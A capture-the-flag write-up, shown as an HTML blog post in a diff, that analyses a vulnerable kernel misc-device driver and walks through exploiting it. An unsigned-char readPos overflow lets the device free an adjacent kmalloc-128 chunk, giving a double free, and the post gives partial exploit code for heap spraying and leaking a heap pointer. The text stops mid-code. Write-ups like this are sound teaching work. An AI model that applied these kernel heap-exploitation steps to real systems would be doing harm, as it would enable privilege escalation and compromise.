@@ -1,0 +1,258 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>crewctf 2022 - qKarachter | circleous</title><link rel=stylesheet href=/css/main.min.a16339a5d57f8df4724d41efd02e48d0023feb1e3934721f39cbdc1bb1a12b31.css integrity="sha256-oWM5pdV/jfRyTUHv0C5I0AI/6x45NHIfOcvcG7GhKzE=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>crewctf 2022 - qKarachter</h1><time datetime=2022-04-18T00:00:00+07:00>April 18, 2022</time></header><p>qKarachter was a kernel challenge, which provided a misc device that can be interacted with ioctl(2).</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#bb9af7>typedef</span> <span style=color:#bb9af7>struct</span> {
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> length;
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> idx;
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span><span style=color:#9ece6a;font-weight:700>*</span> data; <span style=color:#414868;font-style:italic>// ptr to char[144]
+</span></span></span><span style=display:flex><span>} req;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>handle_ioctl</span>(<span style=color:#bb9af7>__int64</span> a1, <span style=color:#41a6b5>int</span> cmd, req <span style=color:#9ece6a;font-weight:700>*</span>arg) {
+</span></span><span style=display:flex><span>  req <span style=color:#9ece6a;font-weight:700>*</span>req;
+</span></span><span style=display:flex><span>  req <span style=color:#9ece6a;font-weight:700>*</span>_req;
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> result;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>mutex_lock</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>mutex);  <span style=color:#414868;font-style:italic>// global lock
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  req <span style=color:#9ece6a;font-weight:700>=</span> (req <span style=color:#9ece6a;font-weight:700>*</span>)<span style=color:#7aa2f7>kmem_cache_alloc_trace</span>(kmalloc_caches[<span style=color:#e0af68>4</span>], <span style=color:#e0af68>3264LL</span>, <span style=color:#e0af68>16LL</span>);
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span>req) {
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>str_malloc_failed);
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>mutex_unlock</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>mutex);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>-</span>ENOMEM;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  _req <span style=color:#9ece6a;font-weight:700>=</span> req;
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> (<span style=color:#7aa2f7>copy_from_user</span>(req, arg, <span style=color:#e0af68>16LL</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>str_copy_from_user_failed);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>-</span>EAGAIN;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>switch</span> (cmd) {
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>case</span> <span style=color:#e0af68>0x1338</span><span style=color:#9ece6a;font-weight:700>:</span>
+</span></span><span style=display:flex><span>      result <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>readData</span>(_req);
+</span></span><span style=display:flex><span>      <span style=color:#bb9af7>goto</span> _success;
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>case</span> <span style=color:#e0af68>0x1339</span><span style=color:#9ece6a;font-weight:700>:</span>
+</span></span><span style=display:flex><span>      result <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>delData</span>(_req<span style=color:#9ece6a;font-weight:700>-&gt;</span>idx);
+</span></span><span style=display:flex><span>      <span style=color:#bb9af7>goto</span> _success;
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>case</span> <span style=color:#e0af68>0x1337</span><span style=color:#9ece6a;font-weight:700>:</span>
+</span></span><span style=display:flex><span>      result <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>addData</span>(_req);
+</span></span><span style=display:flex><span>      <span style=color:#bb9af7>goto</span> _success;
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>default</span><span style=color:#9ece6a;font-weight:700>:</span>
+</span></span><span style=display:flex><span>      <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>str_invalid_choice);
+</span></span><span style=display:flex><span>      <span style=color:#7aa2f7>mutex_unlock</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>mutex);
+</span></span><span style=display:flex><span>      <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>-</span>EINVAL;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#9ece6a>_success</span>:
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>kfree</span>(_req);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>mutex_unlock</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>mutex);
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> result;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Data are created in <code>addData</code> with size of kmalloc-128 and the pointer to it are stored in global array <code>ptrArr</code>.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#bb9af7>typedef</span> <span style=color:#bb9af7>struct</span> {
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> title[<span style=color:#e0af68>16</span>];
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span><span style=color:#9ece6a;font-weight:700>*</span> max_ptr;
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span><span style=color:#9ece6a;font-weight:700>*</span> cur_ptr;
+</span></span><span style=display:flex><span>} info;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>addData</span>(req <span style=color:#9ece6a;font-weight:700>*</span>req) {
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>long</span> tmp;        <span style=color:#414868;font-style:italic>// rax
+</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> idx;         <span style=color:#414868;font-style:italic>// er12
+</span></span></span><span style=display:flex><span>  info <span style=color:#9ece6a;font-weight:700>*</span>info;      <span style=color:#414868;font-style:italic>// rbx
+</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>data;      <span style=color:#414868;font-style:italic>// rax
+</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>req_data;  <span style=color:#414868;font-style:italic>// rsi
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  tmp <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0LL</span>;
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>while</span> (<span style=color:#e0af68>1</span>) {
+</span></span><span style=display:flex><span>    idx <span style=color:#9ece6a;font-weight:700>=</span> tmp;
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span>ptrArr[tmp]) <span style=color:#bb9af7>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>++</span>tmp <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#e0af68>80</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>str_no_more_space_left);
+</span></span><span style=display:flex><span>      <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>-</span>ENOMEM;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  info <span style=color:#9ece6a;font-weight:700>=</span> (info <span style=color:#9ece6a;font-weight:700>*</span>)<span style=color:#7aa2f7>kmem_cache_alloc_trace</span>(kmalloc_caches[<span style=color:#e0af68>5</span>], <span style=color:#e0af68>3264LL</span>, <span style=color:#e0af68>32LL</span>);
+</span></span><span style=display:flex><span>  data <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>)<span style=color:#7aa2f7>kmem_cache_alloc_trace</span>(kmalloc_caches[<span style=color:#e0af68>7</span>], <span style=color:#e0af68>3264LL</span>, <span style=color:#e0af68>128LL</span>);
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span>info <span style=color:#9ece6a;font-weight:700>||</span> <span style=color:#9ece6a;font-weight:700>!</span>data) {
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>str_malloc_failed);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>-</span>ENOMEM;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  req_data <span style=color:#9ece6a;font-weight:700>=</span> req<span style=color:#9ece6a;font-weight:700>-&gt;</span>data;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>memset</span>(data, <span style=color:#e0af68>0</span>, <span style=color:#e0af68>0x80uLL</span>);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>memset</span>(info<span style=color:#9ece6a;font-weight:700>-&gt;</span>title, <span style=color:#e0af68>0LL</span>, <span style=color:#e0af68>16</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  info<span style=color:#9ece6a;font-weight:700>-&gt;</span>cur_ptr <span style=color:#9ece6a;font-weight:700>=</span> data;
+</span></span><span style=display:flex><span>  info<span style=color:#9ece6a;font-weight:700>-&gt;</span>max_ptr <span style=color:#9ece6a;font-weight:700>=</span> data <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>128</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> (<span style=color:#7aa2f7>copy_from_user</span>(data, req_data, <span style=color:#e0af68>128LL</span>) <span style=color:#9ece6a;font-weight:700>&amp;&amp;</span>
+</span></span><span style=display:flex><span>      <span style=color:#7aa2f7>copy_from_user</span>(info, req<span style=color:#9ece6a;font-weight:700>-&gt;</span>data <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>128</span>, <span style=color:#e0af68>16LL</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>str_copy_from_user_failed);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>-</span>EAGAIN;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  ptrArr[idx] <span style=color:#9ece6a;font-weight:700>=</span> info;
+</span></span><span style=display:flex><span>  readPos[idx] <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> idx;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>We can are read with <code>readData</code>. The data that stored in <code>info</code> struct are only pointers, so it basically add a checks if <code>cur_ptr + length &lt; max_ptr</code> and store how much data have been read so far in global array <code>readPos[idx]</code>, <em>*Note that <code>readPos</code> data type is unsigned char*</em>.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>readData</span>(req <span style=color:#9ece6a;font-weight:700>*</span>a1) {
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>long</span> idx;                    <span style=color:#414868;font-style:italic>// rax
+</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> length;         <span style=color:#414868;font-style:italic>// rbp
+</span></span></span><span style=display:flex><span>  info <span style=color:#9ece6a;font-weight:700>*</span>info;                  <span style=color:#414868;font-style:italic>// rbx
+</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>char</span> new_read_pos;  <span style=color:#414868;font-style:italic>// dl
+</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>long</span> result;                 <span style=color:#414868;font-style:italic>// rax
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  idx <span style=color:#9ece6a;font-weight:700>=</span> a1<span style=color:#9ece6a;font-weight:700>-&gt;</span>idx;
+</span></span><span style=display:flex><span>  length <span style=color:#9ece6a;font-weight:700>=</span> a1<span style=color:#9ece6a;font-weight:700>-&gt;</span>length;
+</span></span><span style=display:flex><span>  info <span style=color:#9ece6a;font-weight:700>=</span> ptrArr[idx];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span>info) {
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>str_no_such_item);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>-</span>ENOENT;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  new_read_pos <span style=color:#9ece6a;font-weight:700>=</span> length <span style=color:#9ece6a;font-weight:700>+</span> readPos[idx];            <span style=color:#414868;font-style:italic>// [1]
+</span></span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> (info<span style=color:#9ece6a;font-weight:700>-&gt;</span>max_ptr <span style=color:#9ece6a;font-weight:700>&lt;</span> <span style=color:#9ece6a;font-weight:700>&amp;</span>info<span style=color:#9ece6a;font-weight:700>-&gt;</span>cur_ptr[length] <span style=color:#9ece6a;font-weight:700>||</span> new_read_pos <span style=color:#9ece6a;font-weight:700>&gt;</span> <span style=color:#e0af68>0x80u</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>str_read_limit_exceed);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>-</span>EOVERFLOW;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  readPos[idx] <span style=color:#9ece6a;font-weight:700>=</span> new_read_pos;                     <span style=color:#414868;font-style:italic>// [2]
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> (<span style=color:#7aa2f7>copy_to_user</span>(a1<span style=color:#9ece6a;font-weight:700>-&gt;</span>data, info<span style=color:#9ece6a;font-weight:700>-&gt;</span>cur_ptr, length) <span style=color:#9ece6a;font-weight:700>||</span>
+</span></span><span style=display:flex><span>      <span style=color:#7aa2f7>copy_to_user</span>(a1<span style=color:#9ece6a;font-weight:700>-&gt;</span>data <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>128</span>, info, <span style=color:#e0af68>16LL</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>str_copy_to_user_failed);              <span style=color:#414868;font-style:italic>// [3]
+</span></span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>-</span>EAGAIN;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  info<span style=color:#9ece6a;font-weight:700>-&gt;</span>cur_ptr <span style=color:#9ece6a;font-weight:700>+=</span> length_byte;
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#e0af68>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>… but there is a catch here. <code>new_read_pos</code> is an unsigned char, so it&rsquo;s possible to get an int overflow in [1]. Just before the data copied with <code>copy_to_user</code>, <code>readPos[idx]</code> is assigned with the <code>new_read_pos</code> in [2] and finally, if the <code>copy_to_user</code> failed [3], <code>info->cur_ptr</code> won&rsquo;t be modified but <code>readPos[idx]</code> are already assigned with the <code>new_read_pos</code>. Such a bug won&rsquo;t do much here because <code>readData</code> properly? checks for <code>cur_ptr + length &lt; max_ptr</code>, but it&rsquo;ll be useful for <code>delData</code>.</p><p>In <code>delData</code>, <code>info</code> struct pointer stored in <code>ptrArr</code> and data pointer are freed then NULLed. <code>readPos[idx]</code> is also reset to zero.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>delData</span>(<span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> idx) {
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> _idx;
+</span></span><span style=display:flex><span>  info<span style=color:#9ece6a;font-weight:700>*</span> info;
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span><span style=color:#9ece6a;font-weight:700>*</span> ptr;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  _idx <span style=color:#9ece6a;font-weight:700>=</span> idx;
+</span></span><span style=display:flex><span>  info <span style=color:#9ece6a;font-weight:700>=</span> ptrArr[idx];
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span>info) {
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>str_no_such_item);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>-</span>ENOENT;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  ptr <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a;font-weight:700>&amp;</span>info<span style=color:#9ece6a;font-weight:700>-&gt;</span>cur_ptr[<span style=color:#9ece6a;font-weight:700>-</span>readPos[idx]]; <span style=color:#414868;font-style:italic>// [1]
+</span></span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> (ptr <span style=color:#9ece6a;font-weight:700>&lt;</span> info<span style=color:#9ece6a;font-weight:700>-&gt;</span>max_ptr <span style=color:#9ece6a;font-weight:700>-</span> <span style=color:#e0af68>128</span>) {     <span style=color:#414868;font-style:italic>// [2]
+</span></span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printk</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>str_invalid_pointer);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a;font-weight:700>-</span>EAGAIN;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>kfree</span>(ptr);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>kfree</span>(ptrArr[_idx]);
+</span></span><span style=display:flex><span>  readPos[_idx] <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
+</span></span><span style=display:flex><span>  ptrArr[_idx] <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0LL</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#e0af68>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><code>info</code> struct doesn&rsquo;t store the begin pointer, but instead it stores <code>cur_ptr</code> which is a pointer to where the data have been read so far. So to get around that <code>ptr</code> is calculated with <code>cur_ptr - readPos[idx]</code> [1] which should be the same as begin pointer … if there&rsquo;s no side effects in <code>readData</code>.</p><p>Consider this scenario, we can freely increment <code>readPos[idx]</code> without incrementing <code>cur_ptr</code> and we can also make <code>readPos[idx]</code> int overflow and goes back to 0. Because the checks in [2] is only checking for <code>cur_ptr - readPos[idx] &lt; max_ptr - 128</code> and it doesn&rsquo;t checks if <code>ptr > max_ptr</code>, <strong>we can make <code>delData</code> to free the next adjacent chunk instead of the current chunk if we can make such that <code>cur_ptr == max_ptr</code> and <code>readPos[idx] == 0</code></strong>.</p><p>Free-ing next adjacent chunk can be turned into a double free if we can make data chunk positioned next to each other. To get that, first, we can spray some kmalloc-128 chunks. This can be achieved with spraying <code>msg_msg</code> or just go with <code>addData</code> and <code>delData</code> multiple times.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#414868;font-style:italic>#define SPRAY 0x40
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>main</span>(<span style=color:#41a6b5>int</span> argc, <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>argv[]) {
+</span></span><span style=display:flex><span>      <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>zero <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>malloc</span>(<span style=color:#bb9af7>sizeof</span>(data_s));
+</span></span><span style=display:flex><span>      <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>buffer <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>malloc</span>(<span style=color:#bb9af7>sizeof</span>(data_s));
+</span></span><span style=display:flex><span>      <span style=color:#41a6b5>uint64_t</span> <span style=color:#9ece6a;font-weight:700>*</span>a64 <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>uint64_t</span> <span style=color:#9ece6a;font-weight:700>*</span>)buffer;
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>      <span style=color:#7aa2f7>memset</span>(zero, <span style=color:#e0af68>0</span>, <span style=color:#bb9af7>sizeof</span>(data_s));
+</span></span><span style=display:flex><span>      <span style=color:#7aa2f7>memset</span>(buffer, <span style=color:#e0af68>0x41</span>, <span style=color:#bb9af7>sizeof</span>(data_s));
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>      <span style=color:#414868;font-style:italic>// make heap a little bit deterministic for later stage
+</span></span></span><span style=display:flex><span>      <span style=color:#bb9af7>for</span> (<span style=color:#41a6b5>int</span> i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>; i <span style=color:#9ece6a;font-weight:700>&lt;</span> SPRAY; i<span style=color:#9ece6a;font-weight:700>++</span>) <span style=color:#7aa2f7>add</span>(zero);
+</span></span><span style=display:flex><span>      <span style=color:#bb9af7>for</span> (<span style=color:#41a6b5>int</span> i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>; i <span style=color:#9ece6a;font-weight:700>&lt;</span> SPRAY; i<span style=color:#9ece6a;font-weight:700>++</span>) <span style=color:#7aa2f7>del</span>(i);
+</span></span><span style=display:flex><span>      <span style=color:#bb9af7>for</span> (<span style=color:#41a6b5>int</span> i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>; i <span style=color:#9ece6a;font-weight:700>&lt;</span> SPRAY; i<span style=color:#9ece6a;font-weight:700>++</span>) <span style=color:#7aa2f7>add</span>(zero);
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>Then we can select one of the index to free the next adjacent chunk.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#41a6b5>int</span> selected_idx <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>7</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// readPos[7] set to 0x80, but since the user data ptr
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// is not writeable, copy_to_user would fail and curPtr
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// stll stays at the beginning of the chunk
+</span></span></span><span style=display:flex><span><span style=color:#7aa2f7>view</span>(selected_idx, <span style=color:#e0af68>0x80</span>, (<span style=color:#41a6b5>void</span> <span style=color:#9ece6a;font-weight:700>*</span>)<span style=color:#e0af68>0xdeadbeef</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// uint8 overflow, readPos[7] += 0x80 -&gt; 0x100 -&gt; 0
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// and curPtr set to curPtr + 0x80 which should be max_ptr,
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// so when delete happen it should free the next chunk
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// instead of current chunk kfree((max_ptr) - readPos[7])
+</span></span></span><span style=display:flex><span><span style=color:#7aa2f7>view</span>(selected_idx, <span style=color:#e0af68>0x80</span>, buffer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// free next adjacent chunk
+</span></span></span><span style=display:flex><span><span style=color:#7aa2f7>del</span>(selected_idx);
+</span></span></code></pre></div><p>To know which index is adjacent next to the chunk of selected index, we need to free some chunks to get fd populated and then read the rest of <code>ptrArr</code> check if there&rsquo;s any kernel heap leak.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// populate fd in freed chunk
+</span></span></span><span style=display:flex><span>  <span style=color:#bb9af7>for</span> (<span style=color:#41a6b5>int</span> i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>; i <span style=color:#9ece6a;font-weight:700>&lt;</span> selected_idx; i<span style=color:#9ece6a;font-weight:700>++</span>)
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>del</span>(i);
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// free next adjacent chunk
+</span></span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// find adjacent chunk by viewing the content, if it contains
+</span></span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// a heap fd leak, then this must be the next adjacent chunk
+</span></span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// !!! might fail couple of times, so restart from the very
+</span></span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// begining
+</span></span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> pos;
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>for</span> (pos <span style=color:#9ece6a;font-weight:700>=</span> selected_idx <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>1</span>; pos <span style=color:#9ece6a;font-weight:700>&lt;</span> SPRAY; pos<span style=color:#9ece6a;font-weight:700>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>view</span>(pos, <span style=color:#e0af68>0x80</span>, buffer);
+</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic>// if the chunk is free fd should be populated
+</span></span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic>// kernel heap MSB should contains 0xFF
+</span></span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> (a64[<span style=color:#e0af68>8</span>] <span style=color:#9ece6a;font-weight:700>&gt;&gt;</span> <span style=color:#e0af68>56</span> <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#e0af68>0xff</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#bb9af7>break</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>if</span> (pos <span style=color:#9ece6a;font-weight:700>==</span> SPRAY) {
